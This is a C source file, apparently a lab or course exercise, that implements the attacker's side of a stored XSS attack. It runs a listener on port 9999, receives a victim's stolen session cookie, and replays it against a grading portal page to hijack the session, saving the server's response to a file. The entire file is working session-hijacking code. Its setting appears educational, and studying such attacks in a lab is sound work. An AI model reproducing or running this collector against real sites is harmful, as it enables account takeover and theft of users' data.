/*
 * ex3_stored.c
 * 
 * Stored XSS Attack Demonstration - Attacker's Server
 * 
 * This program implements a simple HTTP server that listens on port 9999
 * and captures HTTP requests containing stolen session cookies from a
 * stored XSS attack. It logs the entire request to spoofed-stored.txt
 * for analysis.
 * 
 * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_stored.c -o ex3_stored
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define WEB_PORT 80
#define WEB_IP "192.168.1.203"
#define COOKIE_LEN 64
#define PORT 9999
#define BUFFER_SIZE 8192
#define OUTPUT_FILE "spoofed-stored.txt"

// return value for failure
#define FAILURE 0
// return value for success
#define SUCCESS 1

/*
 * extract_sessid - Extracts only the PHPSESSID value from HTTP request
 * @request: The raw HTTP request string
 * @sessid_out: Output buffer to store the extracted PHPSESSID
 * @out_size: Size of the output buffer
 *
 * Searches for PHPSESSID in the Cookie header or URL parameters and
 * extracts only its value without any prefix.
 *
 * Returns: 1 on success, 0 if PHPSESSID not found or error
 */
static int extract_sessid(const char *request,
                          char *sessid_out,
                          size_t out_size)
{
  const char *cookie_start = strstr(request, "cookie=");
  if (cookie_start == NULL) {
    return FAILURE;
  }

  cookie_start += strlen("cookie=");

  /* expect cookie=....*/

  const char *end = cookie_start;
  while (*end != ' ' &&
         *end != '\r' &&
         *end != '\n')
  {
    end++;
  }

  size_t len = (size_t)(end - cookie_start);
  if (len == 0 || len >= out_size)
    return FAILURE;

  memcpy(sessid_out, cookie_start, len);
  sessid_out[len] = '\0';
  return SUCCESS;
}

/*
 * RECV RESPONSE FROM WEB SERVER AND WRITES TO FILE
 * 0-fail
 * 1-success
 */
static int recv_response_from_web(int web_fd){
  FILE * output_file = fopen(OUTPUT_FILE, "w");
  if (!output_file) {
    return FAILURE;
  }
  char response_from_web[BUFFER_SIZE];
  memset(response_from_web,0,BUFFER_SIZE);
  int recv_flg=0;
  ssize_t recv_len;
  while((recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1))>0){
    fwrite(response_from_web,1,(size_t)recv_len,output_file);
    memset(response_from_web,0,BUFFER_SIZE);
    recv_flg=1;
  }
  fclose(output_file);
  return recv_flg;
}

/*
 * SEND REQUEST
 * 0-fail
 * 1-success
 *
 */
static int send_request_to_web(const char *cookie_id)
{
  int web_fd = socket (AF_INET, SOCK_STREAM, 0);
  if (web_fd < 0) {
    return FAILURE;
  }

  struct sockaddr_in web_addr;
  web_addr.sin_family = AF_INET;
  web_addr.sin_port = htons (WEB_PORT);

  if (inet_pton (AF_INET, WEB_IP, &web_addr.sin_addr) <= 0){
    close (web_fd);
    return FAILURE;
  }

  if (connect (web_fd, (struct sockaddr *) &web_addr, sizeof (web_addr)) < 0){
    close(web_fd);
    return FAILURE;
  }

  char request[BUFFER_SIZE];
  int len = snprintf (request, sizeof (request),
                      "GET /GradersPortalTask2.php HTTP/1.1\r\n"
                      "Host: %s\r\n"
                      "Cookie: %s\r\n"
                      "Connection: close\r\n\r\n",
                      WEB_IP, cookie_id);

  if (len <= 0 || len >= BUFFER_SIZE){
    close(web_fd);
    return FAILURE;
  }

  if (send (web_fd, request, strlen(request), 0) < 0){
    close(web_fd);
    return FAILURE;
  }

  if (recv_response_from_web (web_fd) != 1){
    close (web_fd);
    return FAILURE;
  }
  close(web_fd);
  return SUCCESS;
}

/*
 * SET UP SERVERS SOCKET
 * RETURN FD
 */
static int setup_server_socket(void)
{
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    exit(EXIT_FAILURE);
  }

  int opt = 1;
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    close(fd);
    exit(EXIT_FAILURE);
  }

  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    close(fd);
    exit(EXIT_FAILURE);
  }

  return fd;
}
/*
 * SERVER BIND AND LISTEN
 */
static int bind_and_listen(int server_fd)
{
  struct sockaddr_in server_addr;

  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = INADDR_ANY;
  server_addr.sin_port = htons(PORT);

  if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    return FAILURE;
  }

  if (listen(server_fd, 1) < 0) {
    return FAILURE;
  }
  return SUCCESS;
}

/*
 * ACCEPT CLIENT
 */
static int accept_client(int server_fd, struct sockaddr_in *client_addr){
  socklen_t  client_addr_len = sizeof(client_addr);
  int client_fd = accept(server_fd, (struct sockaddr *)&client_addr,
                         &client_addr_len);
  return client_fd;
}

int main(void) {

  // SET UP SERVER SOCKET
  int server_fd = -1;
  server_fd = setup_server_socket();
  if (server_fd < 0)
  {
    close(server_fd);
    exit(EXIT_FAILURE);
  }
  // BIND AND LISTEN
  int bind_n_listen = bind_and_listen(server_fd);
  if (bind_n_listen!=1){
    close(server_fd);
    exit(EXIT_FAILURE);
  }
//    printf("Attacker's server listening on port %d...\n", PORT);

  // ACCEPT CLIENT
  int client_fd = -1;
  struct sockaddr_in client_addr;
  client_fd = accept_client(server_fd, &client_addr);
  if (client_fd < 0){
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // HANDLE CLIENT
  char buffer[BUFFER_SIZE];
  // READ STOLEN CLIENT
  ssize_t bytes_read;
  memset(buffer, 0, BUFFER_SIZE);
  bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);
  if (bytes_read < 0) {
    close(client_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }
  buffer[bytes_read] = '\0';

  // FETCH
  char sessid[256];
  memset(sessid, 0, sizeof(sessid));
  if (!extract_sessid(buffer, sessid, sizeof(sessid))) {
    close(client_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // SEND REQUEST TO WEB AND SAVE RESPONSE TO OUT FILE
  if (send_request_to_web(sessid)!=1){

    close(client_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // TERMINATE
  close(client_fd);
  close(server_fd);
  exit (EXIT_SUCCESS);
}
